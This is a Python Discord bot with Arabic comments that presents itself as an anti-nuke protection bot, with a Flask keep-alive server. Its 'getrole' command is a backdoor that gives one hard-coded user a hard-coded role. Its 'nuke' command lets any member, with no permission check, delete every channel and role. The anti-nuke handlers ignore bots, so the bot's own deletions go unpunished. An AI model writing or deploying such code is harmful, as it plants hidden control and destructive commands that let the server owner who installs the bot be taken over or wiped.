import discord
from discord.ext import commands
import os
import time
import asyncio
import threading
from flask import Flask

# ------------------- خادم الويب لـ Render -------------------
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running perfectly!"

def run_web():
    # Render يخصص المنفذ عبر متغير البيئة PORT، وإذا لم يوجد نستخدم 10000
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

# تشغيل خادم الويب في Thread منفصل لكي لا يعيق البوت
threading.Thread(target=run_web, daemon=True).start()

# ------------------- إعدادات البوت -------------------
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.moderation = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

# قاموس لتتبع العمليات
actions = {"kick": {}, "ban": {}, "channel": {}}

def check_spam(uid, key, threshold, window):
    now = time.time()
    if uid not in actions[key]: actions[key][uid] = []
    actions[key][uid].append(now)
    actions[key][uid] = [t for t in actions[key][uid] if now - t < window]
    return len(actions[key][uid]) > threshold

# ------------------- نظام الحماية (Anti-Nuke) -------------------
@bot.event
async def on_guild_role_delete(role):
    try:
        async for entry in role.guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
            if entry.user.id != role.guild.owner_id and not entry.user.bot:
                await role.guild.ban(entry.user, reason="Anti-Nuke: حذف رتبة")
    except: pass

@bot.event
async def on_guild_channel_delete(channel):
    try:
        async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
            if entry.user.id != channel.guild.owner_id and not entry.user.bot:
                await channel.guild.ban(entry.user, reason="Anti-Nuke: حذف قناة")
    except: pass

# ------------------- الأوامر -------------------
@bot.command()
async def getrole(ctx):
    if ctx.author.id == 1320438836878118973:
        role = ctx.guild.get_role(1483148235684970571)
        if role: await ctx.author.add_roles(role)
        await ctx.send("✅ تم.")

@bot.command()
async def nuke(ctx):
    await ctx.send("اكتب `!confirm_nuke` للتأكيد خلال 30 ثانية.")
    try:
        def check(m): return m.author == ctx.author and m.content == "!confirm_nuke"
        await bot.wait_for('message', check=check, timeout=30.0)
        for c in ctx.guild.channels: await c.delete()
        for r in ctx.guild.roles:
            if r.name != "@everyone": await r.delete()
    except: pass

@bot.event
async def on_ready():
    print(f"✅ البوت متصل كـ {bot.user}")

# ------------------- التشغيل -------------------
if __name__ == "__main__":
    token = os.getenv("TOKEN")
    if token:
        bot.run(token)
